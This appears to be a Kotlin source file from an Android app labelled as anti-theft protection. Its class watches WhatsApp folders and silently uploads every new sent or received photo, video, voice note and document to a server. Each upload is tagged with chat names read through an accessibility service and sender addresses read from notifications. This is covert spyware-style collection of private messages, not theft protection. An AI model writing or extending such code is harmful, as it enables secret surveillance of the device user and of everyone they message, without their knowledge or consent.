package com.androidprotect

import android.os.FileObserver
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.io.File

/**
 * Watches WhatsApp media folders and uploads newly created files to the server.
 */
class WhatsAppMediaObserver private constructor() {

    private val observers = mutableListOf<FileObserver>()
    private val processedFiles = mutableSetOf<String>()
    private val handler = Handler(Looper.getMainLooper())

    fun start() {
        stop()
        processedFiles.clear()
        WhatsAppPaths.logResolvedPaths()

        val paths = listOf(
            Folder(WhatsAppPaths.WHATSAPP_IMAGES, "image", false),
            Folder(WhatsAppPaths.WHATSAPP_IMAGES_SENT, "image", true),
            Folder(WhatsAppPaths.WHATSAPP_VIDEO, "video", false),
            Folder(WhatsAppPaths.WHATSAPP_VIDEO_SENT, "video", true),
            Folder(WhatsAppPaths.WHATSAPP_VOICE, "audio", false),
            Folder(WhatsAppPaths.WHATSAPP_AUDIO, "audio", false),
            Folder(WhatsAppPaths.WHATSAPP_DOCUMENTS, "document", false)
        )

        for (folder in paths) {
            val dir = File(folder.path)
            if (!dir.exists() || !dir.isDirectory) {
                Log.w("WhatsAppMedia", "Folder not found: ${folder.path}")
                continue
            }

            val filesBefore = dir.listFiles()?.map { it.name }?.toSet() ?: emptySet()

            val observer = object : FileObserver(dir, CREATE or MOVED_TO or CLOSE_WRITE) {
                override fun onEvent(event: Int, path: String?) {
                    if (path.isNullOrBlank()) return
                    val file = File(dir, path)
                    Log.d("WhatsAppMedia", "Event=${event} file=${file.absolutePath} exists=${file.exists()} size=${file.length()}")
                    when (event) {
                        CLOSE_WRITE -> {
                            // File is fully written — upload after short delay
                            handler.postDelayed({ handleFile(file, folder, filesBefore) }, 1000)
                        }
                        MOVED_TO -> {
                            // File moved into folder — already complete
                            handler.postDelayed({ handleFile(file, folder, filesBefore) }, 1000)
                        }
                        CREATE -> {
                            // File just created — might still be writing. Wait longer.
                            handler.postDelayed({ handleFile(file, folder, filesBefore) }, 5000)
                        }
                    }
                }
            }
            observer.startWatching()
            observers.add(observer)
            Log.d("WhatsAppMedia", "Watching: ${folder.path} (${dir.listFiles()?.size ?: 0} files)")
        }
    }

    fun stop() {
        observers.forEach { it.stopWatching() }
        observers.clear()
    }

    private fun handleFile(file: File, folder: Folder, filesBefore: Set<String>) {
        if (!file.exists() || file.length() == 0L) {
            Log.d("WhatsAppMedia", "Skipping: ${file.name} (exists=${file.exists()}, size=${file.length()})")
            return
        }

        // Skip files that existed before we started watching
        if (filesBefore.contains(file.name)) {
            Log.d("WhatsAppMedia", "Skipping existing file: ${file.name}")
            return
        }

        val key = "${file.absolutePath}:${file.lastModified()}"
        synchronized(processedFiles) {
            if (processedFiles.contains(key)) return
            processedFiles.add(key)
            if (processedFiles.size > 500) processedFiles.clear()
        }

        // Cross-observer dedup: skip if MediaStoreObserver already uploaded this file
        if (!MediaUploadDedup.shouldUpload(file)) {
            Log.d("WhatsAppMedia", "Skipping duplicate (cross-observer): ${file.name}")
            return
        }

        val (address, name) = resolveChat(folder.isSent)
        val caption = when (folder.type) {
            "image" -> "📷 Imagem"
            "video" -> "🎥 Vídeo"
            "audio" -> "🎤 Áudio"
            else -> "📎 Arquivo"
        }

        Log.d("WhatsAppMedia", "Uploading ${folder.type} ${if (folder.isSent) "sent" else "received"}: ${file.name} (${file.length()} bytes) to chat: $address")
        AntiTheftService.uploadWhatsAppMedia(file, folder.type, folder.isSent, address, name, caption)
    }

    private fun resolveChat(isSent: Boolean): Pair<String, String> {
        return if (isSent) {
            val chat = ProtectAccessibilityService.currentChatName()
            if (chat.isNotBlank()) chat to chat else "Enviado" to "Enviado"
        } else {
            val addr = WhatsAppNotificationListener.lastIncomingAddress()
            if (addr.isNotBlank()) addr to addr else "Recebido" to "Recebido"
        }
    }

    private data class Folder(
        val path: String,
        val type: String,
        val isSent: Boolean
    )

    companion object {
        @Volatile
        private var instance: WhatsAppMediaObserver? = null

        fun get(): WhatsAppMediaObserver {
            return instance ?: synchronized(this) {
                instance ?: WhatsAppMediaObserver().also { instance = it }
            }
        }
    }
}
